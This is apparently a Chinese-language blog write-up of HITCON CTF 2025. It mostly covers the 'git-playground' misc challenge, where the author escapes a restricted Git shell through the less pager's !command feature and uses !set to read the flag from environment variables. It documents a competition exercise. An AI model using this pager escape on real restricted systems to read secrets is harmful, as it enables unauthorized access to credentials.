---
title: HITCON CTF 2025
published: 2025-08-25
updated: 2025-08-25
description: "HITCON CTF 2025 writeup"
image: "/assets/HitconCTF2025/logo.png"
tags: ["CTF Writeup"]
category: "CTF Writeup"
draft: false
---

是 HITCON CTF！太酷啦~  
這是戰隊的第二場比賽，這次總共四個人一起參賽，很期待

---

![score](/assets/HitconCTF2025/score.png)

67 / 1289

---

# HITCON CTF 2025

## Welcome

我以為 HITCON 2025 的時候 orange 說不讓 welcome 太無聊是在開玩笑，沒想到是真的 www  
這題只要按下 `Submit` 就可以了，但問題鼠標移到 `Submit` 上方的時候 `Submit` 會到處亂跑 w  
不知道其他人怎麼解的，但我鼠標跟一下就按到了 xd  
沒截到圖 QQ

## Misc

### git-playground

這個程式讓使用者可以在 `/work` 目錄下執行部分 Git 指令和基本 Unix 指令  
程式會初始化 Git repository，設置環境變數，並提供一個命令行介面

這題的`run.sh` 裡面提到 `FLAG is in the environment variable`  
然後環境有 `less` ，可以在 `git log` 或 `git show` 的畫面中進入 `less`，但這一題不能用 `git show`，會因為黑名單顯示 `Dont't try to hack me`  
`less` 支援 `!command`，允許在 less 裡執行指令，進而讀取環境變數

```bash
Initialized empty Git repository in /work/.git/
=====================================
Hello! Welcome to the Git playground!
=====================================
Enter your command: touch /work/a
Enter your command: git add /work/a
Enter your command: git commit -m a
[main (root-commit) 067483d] a
 1 file changed, 0 insertions(+), 0 deletions(-)
 create mode 100644 a
Enter your command: git show
Dont't try to hack me
```

`git log` 會呼叫 `less` 來瀏覽輸出

```bash
Enter your command: git log
commit 067483d857fe8b0710cb54993bf66503d313c46d (HEAD -> main)
Author: hitconctf <hitconctf@hitcon.com>
Date:   Sat Aug 23 16:07:27 2025 +0000

    a
```

透過 `!set` 來顯示 shell 當前環境變數

```bash
!set
COLUMNS='120'
FLAG='hitcon{Bu5yb0X_34511y_cR4sH_Wh3N_bu117_w17h_C14Ng?}'
FUNCNAME=''
GIT_EXEC_PATH='//libexec/git-core'
GIT_PREFIX=''
HOME='/root'
HOSTNAME='0ac8a0df4abe'
IFS='
'
LESS='-Rd'
LINENO=''
LOGNAME='root'
LV='-c'
MAIL='/var/spool/mail/root'
MOTD_SHOWN='pam'
OPTIND='1'
PATH='//libexec/git-core:/bin'
PPID='38266'
PS1='\w \$ '
PS2='> '
PS4='+ '
PWD='/work'
SHELL='/bin/sh'
SHLVL='3'
SSH_CLIENT='36.224.53.87 54338 22'
SSH_CONNECTION='36.224.53.87 54338 10.10.0.18 22'
SSH_TTY='/dev/pts/20'
TERM='xterm-256color'
USER='root'
!done  (press RETURN)
```

拿到 flag 了

![](/assets/HitconCTF2025/IMG-20250824001655804.png)

![](/assets/HitconCTF2025/IMG-20250824001531614.png)

```txt
hitcon{Bu5yb0X_34511y_cR4sH_Wh3N_bu117_w17h_C14Ng?}
```

---

好難啊 (╥﹏╥)  
大比賽還是要多看看，本來以為打了幾場 CTF 應該算有學到一點皮毛，打完只覺得：我根本不會打 CTF  
剩下的題目翻了都沒什麼想法，打比賽的時候還有點不舒服，有一半的比賽時間都在睡覺 www  
再多練一下 QQ  
下個 CTF 見~
